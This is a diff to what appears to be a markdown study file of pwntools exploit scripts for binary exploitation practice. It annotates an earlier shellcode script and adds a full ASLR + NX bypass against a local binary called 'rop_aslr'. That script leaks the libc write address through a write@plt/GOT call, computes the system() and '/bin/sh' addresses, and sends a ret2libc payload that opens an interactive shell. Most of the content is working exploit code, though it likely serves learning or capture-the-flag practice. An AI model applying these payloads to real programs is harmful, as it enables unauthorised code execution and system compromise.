@@ -15,6 +15,10 @@ https://docs.pwntools.com/en/stable/
 ### code
 ```python
 #!/usr/bin/env python3
+
+
+# NX = OFF, ASLR = OFF, Canary = OFF
+
 from pwn import *
 import binascii
 
@@ -50,7 +54,7 @@ p.send(code)
 p.interactive()
 
 ```
-## ret2libc
+## ret2libc NX enabled
 ``` python
 #!/usr/bin/env python3
 from pwn import *
@@ -77,5 +81,48 @@ print (binascii.hexlify(bytearray(code)))
 
 p.send(code)
 
+p.interactive()
+```
+## ASLR + NX enabled
+
+```python
+
+#!/usr/bin/env python3
+from pwn import *
+import binascii
+
+# Arch:     i386-32-little
+# RELRO:    Partial RELRO
+# Stack:    No canary found
+# NX:       NX enabled
+# PIE:      No PIE (0x8048000)
+# ASLR:     Enabled
+
+p = process('./rop_aslr')
+
+libc = ELF('libc.so.6')
+elf = ELF("rop_aslr")
+
+# call write@plt to print the write() address
+plt_wr = elf.symbols['write']
+print('plt_addr= ' + hex(plt_wr))
+got_wr = elf.got['write']
+print('got_addr= ' + hex(got_wr))
+fun_addr = 0x08048456
+payload = bytes(('A'*140).encode()) + p32(plt_wr) + p32(fun_addr) + p32(1) + p32(got_wr) + p32(4)
+p.send(payload)
+
+# calculate the relative distance of write and system() & "/bin/sh"
+wr_addr = u32(p.recv(4))
+print('wr_addr= ' + hex(wr_addr))
+system_addr = wr_addr - (libc.symbols['write'] - libc.symbols['system'])
+print('system_addr= ' + hex(system_addr))
+binsh_addr = wr_addr - (libc.symbols['write'] - next(libc.search(bytes(('/bin/sh').encode()))))
+print('binsh_addr= ' + hex(binsh_addr))
+
+payload2 = bytes(('A'*140).encode()) + p32(system_addr) + p32(fun_addr) + p32(binsh_addr)
+
+# send the code
+p.send(payload2)
 p.interactive()
 ```
